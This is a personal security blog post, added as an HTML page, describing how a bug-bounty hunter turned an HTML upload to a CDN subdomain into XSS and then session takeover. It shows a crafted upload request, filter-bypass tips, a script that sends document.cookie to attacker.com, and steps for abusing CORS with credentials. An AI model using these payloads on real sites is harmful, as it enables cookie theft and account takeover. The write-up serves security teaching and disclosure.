@@ -1,0 +1,168 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reab</title>
+    <link href="/static/favicon.ico" rel="icon"/>
+    <link href="/static/prism.css" rel="stylesheet"/>
+    <link href="/static/style.css" rel="stylesheet"/>
+</head>
+<body>
+
+<header>
+    <a href="/html/about.html"><img class="profile-pic" src="https://avatars.githubusercontent.com/u/122540000?v=4" alt="profile-pic"></a>
+    <a class="header" href="/html/about.html"><h1>Reab:~$<span class="cursor">▋</span></h1></a>
+    <div class="navs">
+        <h1><a class="header" href="/html/about.html">About</a></h1>
+        <h1><a class="header" href="/html/blog/index.html">Blog</a></h1>
+        <h1><a class="header" href="/html/personal/index.html">Personal</a></h1>
+        <h1><a class="header" href="/html/projects/index.html">Projects</a></h1>
+    </div>
+</header>
+
+<div class="global-content">
+<div class="inner-content">
+
+<!-- content start -->
+<h1>Validating and exploiting CDN subdomain XSS</h1>
+
+<p>How can unrestricted file upload to CDN lead to XSS vulenerability with impact?</p>
+
+<p>Requirements:
+- Endpoint that allows the user to upload and access HTML file.
+- SameSite cookie flag is set as <strong>Lax</strong> or <strong>None</strong>.
+- CDN is a trusted origin for requests to target subdomains.
+- Bonus - important cookies are not <strong>HttpOnly</strong>.</p>
+
+<h2>Uploading HTML file</h2>
+
+<p>Capture the file upload request in your proxy, and modify it's content with benign html.</p>
+
+<pre><code class="http language-http">POST /upload/ HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx
+
+------WebKitFormBoundaryxxx
+Content-Disposition: form-data; name="upload"; filename="test.html"
+Content-Type: text/html
+
+&lt;u&gt;testing html&lt;/u&gt;
+------WebKitFormBoundaryxxx--
+</code></pre>
+
+<p>This is an ideal scenario, if the server does not accepts this try tampering with the
+form <strong>content type</strong> or <strong>filename extension</strong>.
+Common bypasses are using %00 <strong>null byte</strong> or semicolon, newline, CRLF...</p>
+
+<h2>Testing JavaScript limits</h2>
+
+<p>If the HTML is rendered properly and accessible by other authenticated users.\
+We can then test a simple JavaScript payload for proof of concept.</p>
+
+<p>You should also monitor the browser dev-tools console for errors.</p>
+
+<pre><code class="html language-html">&lt;script&gt;fetch('https://target.com/api/user/current/')&lt;/script&gt;
+</code></pre>
+
+<p>If you haven't been stopped by a <strong>WAF</strong> or <strong>CORS</strong> error by now that's a great sign.
+Ideally for maximum impact grabbing the cookies would be the best.</p>
+
+<hr />
+
+<p>But more often than not, the session cookie will be HttpOnly, meaning we can't steal it.</p>
+
+<p>There is a decent chance other cookies are up for grabs, possibly for API interaction or other sensitive mechanisms.
+Those other cookies could lead to a full session compromise.</p>
+
+<h3>Cookie stealing</h3>
+
+<pre><code class="html language-html">&lt;script&gt;fetch('https://attacker.com/?x='+btoa(document.cookie))&lt;/script&gt;
+</code></pre>
+
+<p>This script will make an HTTP request to the attacker controlled server and the cookies will be transported as a base64 string in the URL parameter.</p>
+
+<hr />
+
+<p>Just be aware, if you attempt this method for cookie exfiltration.
+You are likely to get a CORS error in the browser console, but worry not.</p>
+
+<p>CORS did not prevent the request from reaching our server, it simply prevented reading the response.</p>
+
+<h3>Abusing include credentials and CORS</h3>
+
+<p>If we cannot steal the session cookie directly, it's time to get creative and get the most impact by taking advantage of include credentials and CORS.</p>
+
+<ul>
+<li>Find a target endpoint that has sensitive functionality or user data.</li>
+<li>Capture a regular usage request in the proxy.</li>
+<li>Change the <strong>Origin: https://target.com</strong> header into with <strong>https://cdn.target.com</strong></li>
+<li>Send the modified request.</li>
+</ul>
+
+<hr />
+
+<p>The server response headers will tell you if CORS will allow you to read the HTTP responses, and if cookies will be included in your XSS requests.</p>
+
+<pre><code class="http language-http"># server response
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://cdn.target.com
+access-control-allow-credentials: true
+</code></pre>
+
+<p>To be able to read sensitive data, this will be sufficient.</p>
+
+<p>But to able to write and modify, CSRF might give you some trouble.</p>
+
+<p>It really depends on what origins are allowed, similar to CORS.</p>
+
+<p>And how the CSRF tokens are implemented and possibly capchas.</p>
+
+<p>Topic for another day...</p>
+
+<hr />
+
+<p>To wrap it up, if CORS allows you to use the include credentials it really depends on case by case basis on how to escalate this into a impactful bug.</p>
+
+<h2>Session takeover via API token</h2>
+
+<p>In my case, what ended up happening is I eventually managed to achieve full session takeover with API cookie, but not in a way I would expect it to happen.</p>
+
+<hr />
+
+<p>I've attempted to figure out a way to achieve takeover via reset password and email endpoints and whatnot...</p>
+
+<p>All failed, because of the prerequired knowledge for that user.
+Until I attempted to open the target website in browser, clear my session and <strong>only</strong> input the stolen API token.</p>
+
+<p>The webapp loaded up and my cookies got auto-filled from the server that correspond to that API token cookie, I assume because it's a trusted secret.</p>
+
+<p>I was shocked to say the least lol.</p>
+
+<hr />
+
+<p>It ended up being one of sorta unrelated endpoints completing my session, no other, so it's worth repeating the mantra <em>HTTP is a stateless protocol</em>.</p>
+
+<p>So in otherwords, one request in isolation does not tell the whole story.</p>
+
+<p>One more takeaway tidbit from this experience was that applications have a tendency to prioritize handling edge cases to just work at the cost of security.</p>
+
+<!-- content end -->
+
+</div></div>
+
+<footer>
+    <div class="socials">
+        <p class="faint">©2026 Author: Mihajlo Frančić<br>
+        <a class="email" href="mailto:mihajlofrancic@gmail.com">mihajlofrancic@gmail.com</a></p>
+    </div>
+    <div class="socials">
+        </a><a href=https://github.com/0Reab><img class="socials" src=https://cdn.simpleicons.org/github/dbdbdb>
+        </a><a href=https://www.linkedin.com/in/mihajlo-francic-3650682bb><img class="socials" src=https://img.icons8.com/?size=100&id=8808&format=png&color=FDFDFD class=inline style=width:17px;height:17px;>
+        </a><a href=https://www.instagram.com/astrosamihajlom/><img class="socials" src=https://cdn.simpleicons.org/instagram/dbdbdb class=inline>
+        </a><a href=https://app.intigriti.com/researcher/profile/reab><img class="socials" src=https://cdn.simpleicons.org/intigriti/ffffff class=inline>
+        </a><a href=https://www.openbugbounty.org/researchers/reab/><img class="socials" src=https://cdn.simpleicons.org/openbugbounty/dbdbdb class=inline>
+    </div>
+</footer>
+
+<script src="/js/prism.js"></script>
+<script src="/js/main.js"></script>
+</body>
+</html>
